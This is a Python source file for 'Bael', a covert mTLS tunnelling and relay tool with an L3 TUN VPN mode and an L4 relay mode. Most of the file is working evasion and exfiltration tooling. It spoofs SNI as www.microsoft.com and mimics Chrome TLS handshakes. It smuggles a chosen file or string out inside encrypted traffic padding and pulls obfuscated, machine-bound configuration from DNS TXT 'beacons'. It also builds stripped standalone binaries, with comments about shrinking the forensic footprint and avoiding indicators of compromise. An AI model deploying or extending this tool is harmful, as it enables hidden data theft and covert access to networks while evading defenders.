#!/usr/bin/env python3
import asyncio,ssl,argparse,random,os,logging,sys,json,socket,subprocess,ipaddress,shutil
import string,fcntl,struct,time,signal,base64,hashlib,colorama
from pathlib import Path
from collections import deque
from typing import Tuple,Optional,Deque,Dict,List,Any
from prometheus_client import start_http_server,Counter,Gauge
class BaelFormatter(logging.Formatter):
    COLORS = {logging.DEBUG: "\x1b[38;2;120;120;120m\x1b[1m",logging.INFO: "\x1b[34m\x1b[1m",logging.WARNING: "\x1b[33m\x1b[1m",logging.ERROR: "\x1b[31m",logging.CRITICAL: "\x1b[31m\x1b[1m"}
    RESET = "\x1b[0m"
    def format(self, record: logging.LogRecord) -> str:
        color = self.COLORS.get(record.levelno, self.COLORS[logging.INFO])
        fmt = f"{self.COLORS[logging.DEBUG]}{{asctime}}{self.RESET} {color}{{levelname:<8}}{self.RESET} \x1b[32m\x1b[1m{{name}}{self.RESET} {{message}}"
        return logging.Formatter(fmt, "%Y-%m-%d %H:%M:%S", style="{").format(record)

logger = logging.getLogger("bael")
logger.setLevel(logging.DEBUG)
handler = logging.StreamHandler()
handler.setFormatter(BaelFormatter())
handler.setLevel(logging.INFO)
logger.addHandler(handler)
SMUGGLE_MAGIC = b"\xBA\x31\xDE\xAD"
__version__ = "0.1.5"
__author__  = "J4ck3LSyN"

class BaelLegacy:
    def __init__(self,args:argparse.Namespace):
        self.args,self.is_frozen,self.temp_dir=args,getattr(sys,'frozen',False),None
        self.bundle_dir=Path(getattr(sys,'_MEIPASS',os.getcwd()))
        if self.is_frozen:
            self._deploy_bundled_keys()
        self.typeSvr=args.mode in ["server","buildServer"]
        self.smuggleQueue:Deque[bytes]=deque()
        if args.data_transmit: self._loadSmuggleData(args.data_transmit,args.max_padding)
        self.whitelist=[ipaddress.ip_network(x.strip()) for x in args.whitelist.split(",")] if args.whitelist else None
        self.sniMap:Dict[str,str]={}
        if args.map:
            try:self.sniMap=json.loads(Path(args.map).read_text(encoding="utf-8"))
            except Exception as e:logger.error(f"SNI map fail: {e}")
        self.lAddr=self.parseAddr(args.listen);self.rAddr=self.parseAddr(args.remote) if args.remote else None
        self.ssl_ctx=self._genSSLCTX() if all([args.cert,args.key,args.ca]) else None
        self.CONNECTIONS_TOTAL=Counter("bael_conn_total","Total conns",["direction"])
        self.ACTIVE_CONNECTIONS=Gauge("bael_active_conn","Active conns")
        self.BYTES_TRANSFERRED=Counter("bael_bytes_total","Bytes total",["direction"])
        self.server:Optional[asyncio.Server]=None
        signal.signal(signal.SIGTERM, self._signal_handler)
        signal.signal(signal.SIGINT, self._signal_handler)

    def _signal_handler(self, signum, frame):
        self._cleanup_keys()
        sys.exit(0)

    def _cleanup_keys(self):
        if self.temp_dir and self.temp_dir.exists():
            try: shutil.rmtree(self.temp_dir);logger.info("Keys cleaned up.")
            except Exception as e: logger.error(f"Cleanup failed: {e}")

    def _deploy_bundled_keys(self):
        meipass = getattr(sys, '_MEIPASS', None)
        if not meipass: return
        bundled_keys = Path(meipass) / ".baelKeys"
        if not bundled_keys.exists(): return
        base_target = Path("/dev/shm") if Path("/dev/shm").exists() else Path("/tmp")
        self.temp_dir = base_target / f".bael_{''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}"
        try:
            self.temp_dir.mkdir(parents=True, exist_ok=True)
            for f in bundled_keys.glob("*"): shutil.copy(f, self.temp_dir / f.name)
            self.args.cert = str(self.temp_dir / Path(self.args.cert if self.args.cert else 'srv.crt').name)
            self.args.key = str(self.temp_dir / Path(self.args.key if self.args.key else 'srv.key').name)
            self.args.ca = str(self.temp_dir / Path(self.args.ca if self.args.ca else 'ca.crt').name)
        except Exception as e: logger.error(f"Extraction failed: {e}")

    def parseAddr(self,s:str)->Tuple[str,int]:
        if ":" in s and s.count(":")>1 and "[" not in s:
            host,port=s.rsplit(":",1);return host.strip("[]"),int(port)
        host,port=s.split(":",1);return host,int(port)

    def _genSSLCTX(self)->ssl.SSLContext:
        ctx=ssl.create_default_context(ssl.Purpose.CLIENT_AUTH if self.typeSvr else ssl.Purpose.SERVER_AUTH,cafile=self.args.ca)
        ctx.load_cert_chain(certfile=self.args.cert,keyfile=self.args.key);ctx.verify_mode=ssl.CERT_REQUIRED
        ctx.check_hostname=False;ctx.minimum_version=ssl.TLSVersion.TLSv1_3
        if self.args.tls_profile=="chrome":
            ctx.set_ciphers("ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384")
        ctx.set_alpn_protocols(["h2","http/1.1"]);return ctx

    def _loadSmuggleData(self,data:str,max_pad:int):
        try:
            p=Path(data);raw=p.read_bytes() if p.exists() else data.encode()
            chunk_size=max(1,max_pad-10)
            for i in range(0,len(raw),chunk_size):self.smuggleQueue.append(raw[i:i+chunk_size])
        except Exception as e:logger.error(f"Smuggle load fail: {e}")

    def _addPadding(self,data:bytes,is_encrypted_side:bool)->bytes:
        if not (self.args.morphing and is_encrypted_side) or random.random()>self.args.morph_chance: return data
        if self.smuggleQueue:
            payload=self.smuggleQueue.popleft();return data+SMUGGLE_MAGIC+bytes([len(payload)])+payload
        return data+os.urandom(random.randint(8,self.args.max_padding))

    def _extractSmuggled(self,chunk:bytes)->Tuple[bytes,list[bytes]]:
        if SMUGGLE_MAGIC not in chunk: return chunk,[]
        extracted,parts,clean=[],chunk.split(SMUGGLE_MAGIC),chunk.split(SMUGGLE_MAGIC)[0]
        for part in parts[1:]:
            if len(part)>0:
                length=part[0];extracted.append(part[1:1+length]);clean+=part[1+length:]
        return clean,extracted

    async def _pump(self,reader:asyncio.StreamReader,writer:asyncio.StreamWriter,direction:str,is_encrypted:bool):
        try:
            while not reader.at_eof():
                chunk=await reader.read(16384)
                if not chunk:break
                if is_encrypted:
                    chunk,smuggled=self._extractSmuggled(chunk)
                    for s in smuggled:logger.info(f"Extracted: {s.decode(errors='replace')[:50]}")
                data=self._addPadding(chunk,is_encrypted);writer.write(data)
                self.BYTES_TRANSFERRED.labels(direction).inc(len(data))
                if writer.transport.get_write_buffer_size()>131072:await writer.drain()
        except Exception as e:logger.debug(f"Pump {direction} fail: {e}")
        finally:
            if not writer.is_closing():writer.close()

    async def handle(self,local_r:asyncio.StreamReader,local_w:asyncio.StreamWriter):
        peer=local_w.get_extra_info("peername")[0]
        if not (self.whitelist is None or any(ipaddress.ip_address(peer) in net for net in self.whitelist)):
            local_w.close();return
        target=self.rAddr
        if self.typeSvr and self.sniMap:
            ssl_obj=local_w.get_extra_info("ssl_object");sni=ssl_obj.server_hostname if ssl_obj else None
            if sni in self.sniMap:target=self.parseAddr(self.sniMap[sni])
        if not target:local_w.close();return
        self.ACTIVE_CONNECTIONS.inc();self.CONNECTIONS_TOTAL.labels("in" if self.typeSvr else "out").inc()
        try:
            remote_r,remote_w=await asyncio.open_connection(*target,ssl=None if self.typeSvr else self.ssl_ctx,server_hostname=self.args.sni if not self.typeSvr else None)
            await asyncio.gather(self._pump(local_r,remote_w,"to_remote",not self.typeSvr),self._pump(remote_r,local_w,"to_client",self.typeSvr),return_exceptions=True)
        except Exception as e:logger.error(f"Relay error: {e}")
        finally:self.ACTIVE_CONNECTIONS.dec()

    async def run(self):
        start_http_server(self.args.metrics_port)
        self.server=await asyncio.start_server(self.handle,*self.lAddr,ssl=self.ssl_ctx if self.typeSvr else None)
        async with self.server:await self.server.serve_forever()

class Bael:
    def __init__(self,config:dict):
        self.config,self.logger,self.temp_dir=config,logger,None
        if getattr(sys, 'frozen', False):
            self._deploy_bundled_keys()
        self.sslContext,self.tunFd,self.tunName=self.createSslContext(),-1,""
        # Register signal handlers to ensure the TUN interface is destroyed on exit
        signal.signal(signal.SIGTERM, self._signal_handler)
        signal.signal(signal.SIGINT, self._signal_handler)

    def _signal_handler(self, signum, frame):
        self.logger.info(f"Received signal {signum}, performing cleanup...")
        self.destroyTun()
        sys.exit(0)

    def _deploy_bundled_keys(self):
        meipass = getattr(sys, '_MEIPASS', None)
        if not meipass: return
        bundled_keys = Path(meipass) / ".baelKeys"
        if not bundled_keys.exists(): return
        base_target = Path("/dev/shm") if Path("/dev/shm").exists() else Path("/tmp")
        self.temp_dir = base_target / f".bael_{''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}"
        try:
            self.temp_dir.mkdir(parents=True, exist_ok=True)
            for f in bundled_keys.glob("*"): shutil.copy(f, self.temp_dir / f.name)
            self.config['certFile'] = str(self.temp_dir / Path(self.config.get('certFile', 'srv.crt')).name)
            self.config['keyFile'] = str(self.temp_dir / Path(self.config.get('keyFile', 'srv.key')).name)
            self.config['caFile'] = str(self.temp_dir / Path(self.config.get('caFile', 'ca.crt')).name)
        except Exception as e: self.logger.error(f"Extraction failed: {e}")

    def createSslContext(self)->ssl.SSLContext:
        ctx=ssl.create_default_context(ssl.Purpose.SERVER_AUTH if self.config.get("mode")=="client" else ssl.Purpose.CLIENT_AUTH)
        if self.config.get("mTLS"):
            ctx.load_cert_chain(certfile=self.config.get("certFile"),keyfile=self.config.get("keyFile"))
            ctx.load_verify_locations(cafile=self.config.get("caFile"));ctx.verify_mode=ssl.CERT_REQUIRED
        return ctx

    def validatePrivileges(self):
        if os.getuid()!=0:self.logger.critical("Root required.");sys.exit(1)

    def setupTun(self,persist:int=1):
        self.tunFd=os.open("/dev/net/tun",os.O_RDWR)
        ifr=struct.pack('16sH',bytes(self.config.get("tunName","bael0"),'utf-8'),0x0001|0x1000)
        res=fcntl.ioctl(self.tunFd,0x400454ca,ifr);self.tunName=res[:16].decode('utf-8').strip('\x00')
        fcntl.ioctl(self.tunFd,0x400454cb,persist)
        if persist:self.setTunAddress(self.config.get("tunIp","10.8.0.1"),self.config.get("tunMask","255.255.255.0"))

    def setTunAddress(self,ip:str,mask:str):
        with socket.socket(socket.AF_INET,socket.SOCK_DGRAM) as s:
            ifreq=struct.pack('16sH2s4s8s',bytes(self.tunName,'utf-8'),socket.AF_INET,b'\x00\x00',socket.inet_aton(ip),b'\x00'*8)
            fcntl.ioctl(s.fileno(),0x8916,ifreq)
            ifrFlags=struct.pack('16sH',bytes(self.tunName,'utf-8'),0x0001|0x0004);fcntl.ioctl(s.fileno(),0x8914,ifrFlags)

    def destroyTun(self):
        try:
            fd=os.open("/dev/net/tun",os.O_RDWR);ifr=struct.pack('16sH',bytes(self.config.get("tunName","bael0"),'utf-8'),0x0001|0x1000)
            fcntl.ioctl(fd,0x400454ca,ifr);fcntl.ioctl(fd,0x400454cb,0);os.close(fd);logger.info(f"TUN {self.tunName} removed.")
        except Exception as e:logger.error(f"TUN removal failed: {e}")
        if self.temp_dir and self.temp_dir.exists():
            try:
                shutil.rmtree(self.temp_dir)
                self.logger.info("Keys cleaned up.")
            except Exception as e: self.logger.error(f"Keys cleanup failed: {e}")

    def resolveDnsTxt(self,domain:str)->str:
        try:
            tid=random.getrandbits(16);head=struct.pack('!HHHHHH',tid,0x0100,1,0,0,0)
            q=b''.join(len(l).to_bytes(1,'big')+l.encode() for l in domain.split('.'))+b'\x00'+struct.pack('!HH',16,1)
            with socket.socket(socket.AF_INET,socket.SOCK_DGRAM) as s:
                s.settimeout(5);s.sendto(head+q,("8.8.8.8",53));data,_=s.recvfrom(1024)
            idx=data.find(b'\xc0\x0c',len(head+q))
            if idx!=-1:
                raw=data[idx+12:idx+12+data[idx+11]]
                try:
                    d=base64.b64decode(raw)
                    key=hashlib.md5(socket.gethostname().encode()).digest()
                    return bytes([d[i]^key[i%len(key)] for i in range(len(d))]).decode()
                except:return raw.decode()
        except Exception:return ""

    async def bridge(self,r,w,toSsl=True):
        try:
            while True:
                if toSsl:
                    data=await asyncio.get_event_loop().run_in_executor(None,os.read,self.tunFd,2048)
                    w.write(data);await w.drain()
                else:
                    data=await r.read(2048)
                    if not data:break
                    os.write(self.tunFd,data)
        except Exception:pass

    async def start(self,attempt:int=1):
        self.validatePrivileges();self.setupTun()
        target,port=self.config['remoteHost'],self.config['remotePort']
        wait=self.config['retryInterval']*(2**(attempt-1))+(self.config['retryInterval']*self.config['jitter']*random.uniform(-1,1))
        try:
            if attempt>1:await asyncio.sleep(wait)
            reader,writer=await asyncio.open_connection(target,port,ssl=self.sslContext)
            logger.info(f"mTLS L3 Tunnel Active: {target}")
            await asyncio.gather(self.bridge(reader,writer,True),self.bridge(reader,writer,False))
        except Exception as e:
            logger.error(f"L3 Connection failed: {e}")
            if attempt<self.config.get("maxRetries",5):await self.start(attempt+1)

    @staticmethod
    def buildExecutable(name="bMTLSTUN0", verbose=False, bundle_keys=True):
        if sys.platform != "linux":
            logger.error("Build aborted: This orchestrator is optimized for Linux targets only.")
            return

        buildPath = Path(".baelBuild")
        try:
            logger.debug(f"Initializing build environment in {buildPath}...")
            import PyInstaller.__main__
            # Ensure clean workspace
            buildPath.mkdir(parents=True, exist_ok=True)
            logger.debug(f"Build initiated. Working directory: {os.getcwd()}")
            dPath = buildPath / "dist"
            wPath = buildPath / "work"

            # Note: PyInstaller's --key argument for bytecode encryption was removed in v6.0+.
            # Generating a unique key here for potential future use or other obfuscation methods.
            obfuscation_key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            logger.debug(f"Generated build-specific obfuscation key: {obfuscation_key}")

            logger.warning("ENCRYPTION LIMITATION: PyInstaller 6.0+ has removed native bytecode encryption (--key).")
            logger.warning("Manual obfuscation (e.g., PyArmor) is required for source code protection.")

            # Aggressive exclusions to remove GUI (tkinter/tcl), tests, and development bloat
            exclusions = [
                "tkinter", "tcl", "tk", "_tkinter", "unittest", "pydoc", "xml", "distutils", 
                "setuptools", "sqlite3", "test", "lib2to3", "pydoc_data", "curses"]
            cArgs = [
                str(Path(sys.argv[0]).resolve()), 
                '--onefile', 
                '--name=' + name, 
                '--clean',
                '--strip',               # Remove symbol tables to reduce forensic footprint
                # '--key=' + obfuscation_key, # Removed: Bytecode encryption via --key is deprecated in PyInstaller v6.0+
                '--noupx',               # UPX packing is a common indicator of compromise; avoid it
                '--distpath', str(dPath),
                '--workpath', str(wPath),
                '--specpath', str(buildPath)]
            
            if verbose:
                cArgs.append('--log-level=DEBUG')
                logger.debug("Verbosity enabled for PyInstaller build process.")

            for mod in exclusions: cArgs.extend(['--exclude-module', mod])

            # Bundle certificates for portable execution
            keys_dir = Path(".baelKeys")
            if bundle_keys and keys_dir.exists():
                abs_keys = keys_dir.resolve()
                logger.info(f"Bundling certificates from {abs_keys}")
                # Using absolute path for source to prevent PyInstaller from looking relative to --specpath
                cArgs.extend(['--add-data', f'{abs_keys}:.baelKeys'])
            else:
                logger.warning(f"Certificate directory {keys_dir} not found. Proceeding without bundled keys.")

            logger.info(f"Starting PyInstaller build process for: {name}")
            logger.debug(f"Workspace: {buildPath.absolute()}")
            logger.debug(f"PyInstaller command arguments: {cArgs}")
            PyInstaller.__main__.run(cArgs)
            logger.info(f"PyInstaller build process completed successfully for: {name}")
            logger.info(f"Build complete. Binary located in: {dPath}/")
        except ImportError: logger.error("PyInstaller missing. Install with: pip install pyinstaller")
        except Exception as e: logger.error(f"Build failed: {e}")

class ShortHelpAction(argparse.Action):
    def __init__(self, option_strings, dest, nargs=0, **kwargs):
        super(ShortHelpAction, self).__init__(option_strings, dest, nargs=nargs, **kwargs)
    def __call__(self, parser, namespace, values, option_string=None):
        message = [
            f"\x1b[34m\x1b[1mBael v{__version__} - Minimal Help\x1b[0m",
            "usage: baelV015.py [-h] [--help] [--mode {server,client,tun,keygen,build,encode-dns}] [--verbose] [--legacy] [options]",
            "",
            "Modes:",
            "  --mode tun          L3 VPN Tunnel (Requires Root)",
            "  --mode server       L4 Relay Server",
            "  --mode client       L4 Relay Client",
            "  --mode keygen       Generate PKI certificates",
            "  --mode build        Compile to standalone binary",
            "  --mode encode-dns   Obfuscate config for DNS",
            "",
            "Common Options:",
            "  --config <file>     Path to JSON config",
            "  --gen-config        Interactive config wizard",
            "  --remote <host:port> Remote peer address",
            "  --listen <host:port> Local bind address",
            "  --verbose           Enable debug logging",
            "",
            "Use --help for full documentation and examples."
        ]
        print("\n".join(message))
        parser.exit()

def build_parser()->argparse.ArgumentParser:
    p=argparse.ArgumentParser(
        description="Bael v0.1.5 mTLS Orchestrator\n\nA high-performance, stealth-focused L3/L4 relay utilizing mutual TLS and native TUN interfaces.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        add_help=False,
        epilog="""
Operational Examples:
  [+] PKI Setup:
      %(prog)s --mode keygen

  [+] L3 TUN Client (Requires Root):
      sudo %(prog)s --mode tun --config tun_settings.json --cert rmt.crt --key rmt.key --ca ca.crt

  [+] L4 Relay Server (SNI Mapping):
      %(prog)s --mode server --listen 0.0.0.0:443 --map routes.json --cert srv.crt --key srv.key --ca ca.crt

  [+] Interactive Config:
      %(prog)s --gen-config

  [+] Obfuscated DNS Beacon Generation:
      %(prog)s --mode encode-dns --encode-str '{"remoteHost":"1.2.3.4"}' --target-hostname workstation-01

Note: L3 'tun' mode requires the script to be run with root privileges to manage virtual interfaces. 
The DNS obfuscation is machine-bound; the target hostname must match exactly for decryption to succeed.
        """
    )
    core = p.add_argument_group("Core Mode Options")
    core.add_argument("-h", action=ShortHelpAction, help="Show minimal help message.")
    core.add_argument("--help", action="help", help="Show full documentation and examples.")
    core.add_argument("--mode",choices=["server","client","tun","keygen","build","encode-dns"],required=False, help="Operation mode: 'server'/'client' (L4), 'tun' (L3), 'keygen' (PKI setup), 'build' (binary), or 'encode-dns' (obfuscation).")
    core.add_argument("--verbose",action="store_true",help="Enable verbose logging.")
    core.add_argument("--legacy",action="store_true",help="Force legacy Layer 4 relay logic instead of native Layer 3 TUN interface functionality.")

    net = p.add_argument_group("Network Configuration")
    net.add_argument("--listen",default="0.0.0.0:53", metavar="ADDR:PORT", help="Local address and port to bind for listening (default: 0.0.0.0:53).")
    net.add_argument("--remote", metavar="ADDR:PORT", help="Address and port of the remote peer to connect to.")
    net.add_argument("--config", metavar="FILE", help="JSON configuration file for native TUN mode (defines IPs, masks, and retries).")
    net.add_argument("--dns-lookup", metavar="DOMAIN", help="Domain to query for an obfuscated DNS TXT record containing peer configuration.")
    net.add_argument("--metrics-port",type=int,default=9100, metavar="PORT", help="Port for the Prometheus metrics exporter (default: 9100).")

    stealth = p.add_argument_group("Stealth & Evasion Options")
    stealth.add_argument("--tls-profile",choices=["default","chrome","firefox"],default="chrome", help="Browser fingerprint to emulate during handshake (default: chrome).")
    stealth.add_argument("--sni",default="www.microsoft.com", metavar="HOST", help="Server Name Indication string for the client handshake (default: www.microsoft.com).")
    stealth.add_argument("--morphing",action="store_true",default=True, help="Apply traffic morphing (random padding and data smuggling) to evade statistical analysis.")
    stealth.add_argument("--morph-chance",type=float,default=0.65, metavar="0-1", help="Probability that a packet will include morphing/padding (default: 0.65).")
    stealth.add_argument("--max-padding",type=int,default=255, metavar="BYTES", help="Maximum size of random padding added to packets (default: 255).")
    stealth.add_argument("--data-transmit", metavar="STR|PATH", help="File path or string to smuggle opportunistically inside encrypted traffic padding.")
    stealth.add_argument("--encode-str", metavar="DATA", help="Plaintext string to obfuscate for a DNS TXT configuration record.")
    stealth.add_argument("--target-hostname", metavar="NAME", help="Hostname of the target machine used to derive the XOR key for DNS obfuscation.")

    pki = p.add_argument_group("Authentication & PKI")
    pki.add_argument("--cert", metavar="FILE", help="Path to the TLS public certificate (.crt).")
    pki.add_argument("--key", metavar="FILE", help="Path to the private TLS key (.key).")
    pki.add_argument("--ca", metavar="FILE", help="Path to the CA certificate for mutual TLS verification.")
    pki.add_argument("--no-bundle", action="store_false", dest="bundle_keys", default=True, help="Disable bundling of certificates in the binary.")
    pki.add_argument("--whitelist", metavar="CIDR", help="Comma-separated IP/CIDR ranges allowed to connect (Server mode only).")
    pki.add_argument("--map", metavar="FILE", help="JSON mapping of incoming SNI hostnames to target backend addresses (Server mode only).")

    gen = p.add_argument_group("Configuration Generation")
    gen.add_argument("--gen-config", action="store_true", help="Launch interactive wizard to generate a JSON configuration file for native TUN mode. Example: python3 baelV015.py --gen-config")
    
    return p

def generate_config_interactive():
    """Launches an interactive wizard to generate a JSON configuration for Bael."""
    print(f"\n{colorama.Fore.CYAN}--- Bael Interactive Configuration Wizard ---{colorama.Fore.RESET}")
    try:
        config = {}
        mode = input("[?] Operation Mode (client/server) [client]: ").strip().lower() or "client"
        config['mode'] = mode

        if mode == "server":
            config['listenHost'] = input("[?] Listen Address [0.0.0.0]: ").strip() or "0.0.0.0"
            config['listenPort'] = int(input("[?] Listen Port [443]: ").strip() or 443)
        else:
            config['remoteHost'] = input("[?] Remote Peer Address (IP or Domain): ").strip()
            try:
                config['remotePort'] = int(input("[?] Remote Peer Port [443]: ").strip() or 443)
            except ValueError:
                config['remotePort'] = 443

        config['tunName'] = input("[?] TUN Interface Name [bael0]: ").strip() or "bael0"
        config['tunIp'] = input("[?] Virtual TUN IP [10.8.0.1]: ").strip() or "10.8.0.1"
        config['tunMask'] = input("[?] Virtual TUN Mask [255.255.255.0]: ").strip() or "255.255.255.0"
        try:
            config['retryInterval'] = int(input("[?] Reconnect Interval (seconds) [2]: ").strip() or 2)
            config['jitter'] = float(input("[?] Reconnect Jitter (0.0-1.0) [0.2]: ").strip() or 0.2)
        except ValueError:
            config['retryInterval'] = 2
            config['jitter'] = 0.2
        config['mTLS'] = input("[?] Enable mutual TLS (mTLS)? (y/n) [y]: ").strip().lower() != 'n'
        if config['mTLS']:
            config['certFile'] = input("[?] Path to Certificate (.crt): ").strip()
            config['keyFile'] = input("[?] Path to Private Key (.key): ").strip()
            config['caFile'] = input("[?] Path to CA Certificate (.crt): ").strip()
        config['logLevel'] = input("[?] Log Level (DEBUG/INFO/WARNING/ERROR) [INFO]: ").strip().upper() or "INFO"
        filename = input("[?] Save configuration as [tun_settings.json]: ").strip() or "tun_settings.json"
        with open(filename, 'w') as f:
            json.dump(config, f, indent=4)
        logger.info(f"Configuration successfully written to {filename}")
    except KeyboardInterrupt:
        print("\n[!] Wizard aborted.")
        sys.exit(0)

def genkeys(args):
    keysRoot=Path(".baelKeys");keysRoot.mkdir(exist_ok=True)
    logger.info("Generating mTLS PKI...")
    def run(cmd): subprocess.run(cmd,shell=True,check=True,capture_output=True)
    try:
        run(f'openssl req -x509 -newkey rsa:4096 -keyout {keysRoot}/ca.key -out {keysRoot}/ca.crt -days 365 -nodes -subj "/CN=BaelCA"')
        for r in ["srv","rmt"]:
            run(f'openssl req -newkey rsa:4096 -keyout {keysRoot}/{r}.key -out {keysRoot}/{r}.csr -nodes -subj "/CN=Bael-{r}"')
            run(f'openssl x509 -req -in {keysRoot}/{r}.csr -CA {keysRoot}/ca.crt -CAkey {keysRoot}/ca.key -CAcreateserial -out {keysRoot}/{r}.crt -days 365')
        logger.info(f"Keys generated in {keysRoot}")
    except Exception as e:logger.error(f"Keygen fail: {e}")

if __name__=="__main__":
    args=build_parser().parse_args()
    if args.gen_config:
        generate_config_interactive()
        sys.exit(0)
    if args.mode=="keygen":genkeys(args);sys.exit(0)
    if args.mode=="encode-dns":
        if not args.encode_str or not args.target_hostname:
            logger.error("--encode-str and --target-hostname are required for encode-dns mode")
            sys.exit(1)
        k=hashlib.md5(args.target_hostname.encode()).digest()
        p=args.encode_str.encode()
        res=base64.b64encode(bytes([p[i]^k[i%len(k)] for i in range(len(p))])).decode()
        print(f"\n[+] Obfuscated DNS TXT Record (Machine-Bound to {args.target_hostname}):\n{res}\n")
        sys.exit(0)
    if args.mode=="build":
        Bael.buildExecutable("bMTLSTUN0_LEGACY" if args.legacy else "bMTLSTUN0", verbose=args.verbose, bundle_keys=args.bundle_keys);sys.exit(0)
    if args.legacy:
        if not all([args.cert,args.key,args.ca]):logger.error("Legacy requires --cert --key --ca");sys.exit(1)
        legacy=BaelLegacy(args)
        try:asyncio.run(legacy.run())
        except KeyboardInterrupt:pass
    else:
        conf={"logLevel":"INFO","maxRetries":5,"retryInterval":2,"jitter":0.2,"mTLS":True,"mode":"client","tunName":"bael0"}
        if args.config and os.path.exists(args.config):
            with open(args.config,'r') as f:conf.update(json.load(f))
        
        if not args.config and args.mode=="tun":
            conf.update({
                "remoteHost": args.remote.split(":")[0] if args.remote else None,
                "remotePort": int(args.remote.split(":")[1]) if args.remote and ":" in args.remote else 443,
                "certFile": args.cert,"keyFile": args.key,"caFile": args.ca,
                "mode": "server" if args.mode=="server" else "client"
            })
            
        tool=Bael(conf)
        if args.dns_lookup:
            txt=tool.resolveDnsTxt(args.dns_lookup)
            if txt:
                try:conf.update(json.loads(txt))
                except:logger.info(f"DNS TXT: {txt}")
        
        effective_mode = args.mode or conf.get("mode")
        if effective_mode=="server":
            # Simplified server for TUN mode
            async def tun_server():
                tool.validatePrivileges();tool.setupTun()
                async def handle_tun(r,w):
                    logger.info("Inbound L3 Tunnel verified.")
                    await asyncio.gather(tool.bridge(r,w,True),tool.bridge(r,w,False))
                l_host = conf.get("listenHost", args.listen.split(":")[0])
                l_port = int(conf.get("listenPort", args.listen.split(":")[1]))
                server=await asyncio.start_server(handle_tun,l_host,l_port,ssl=tool.sslContext)
                async with server:await server.serve_forever()
            try:asyncio.run(tun_server())
            except KeyboardInterrupt:pass
        else:
            try:asyncio.run(tool.start())
            except KeyboardInterrupt:pass
